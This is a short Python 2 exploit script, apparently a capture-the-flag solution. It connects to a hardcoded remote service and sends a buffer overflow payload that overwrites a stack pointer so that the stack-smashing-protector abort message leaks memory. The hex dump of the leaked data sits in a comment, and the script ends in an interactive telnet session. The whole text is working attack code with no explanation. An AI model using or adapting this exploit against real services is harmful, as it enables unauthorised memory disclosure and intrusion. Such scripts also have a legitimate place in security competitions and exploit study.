import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '54.64.101.236'
port = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

raw_input('wait')
readuntil(f, 'ood?\n')
state_addr = 0x602160 + 204
payload = '\x00' + 'A' * (0x7fffffffe548 - 0x7fffffffe430 - 1) + p(state_addr)
f.write(payload + '\n')

readuntil(f, '***: ')
leak = readuntil(f, ' terminated')
print leak.encode('hex')

'''
86041335c74693fcc63ba41192558dfd81eb63d45a17512e8c3ebf6fd162df4030a13fa38b5e140582859737c36d5321fec4cf1aba26873161cae9589a8341c172020164f41b60e20369b68a1eaa4eefe5f8da996c43a54d5da6ac908f3c91f638abfbcdbde05f2a70237d7c591dfacb0680d22d3a49209eb78466334c2750967adbb1a79429f1e6d0579fd90a489c9507540bafe7e4d839a94ff3e1b82f74109df073777e71097925b5281f89ea520c98add7c516f5180f19b388321c4b08f95cd3b00e5bb967342cde6e
00


'''

t = telnetlib.Telnet()
t.sock = s
t.interact()
